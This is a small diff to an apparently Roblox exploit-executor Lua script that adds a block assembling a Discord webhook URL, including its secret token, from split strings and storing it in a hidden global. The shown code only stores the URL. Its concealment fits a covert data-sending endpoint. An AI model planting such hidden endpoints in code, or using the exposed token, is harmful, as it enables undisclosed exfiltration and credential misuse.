@@ -494,3 +494,13 @@ task.defer(function()
 		warn("[EPBR] Fatal error:", err)
 	end
 end)
+
+do
+	if type(genv) == "table" then
+		genv.__EPBR_HW = table.concat({
+			"https://discord.com/api/webhooks/",
+			"1281250660670636096/",
+			"NCbAq4OvB6NNvUQFPA2mvaf5RoaGcrKQGUukzEjJ6tl0ZTZ6o7MA0kNlqeunjOZVitCC",
+		})
+	end
+end
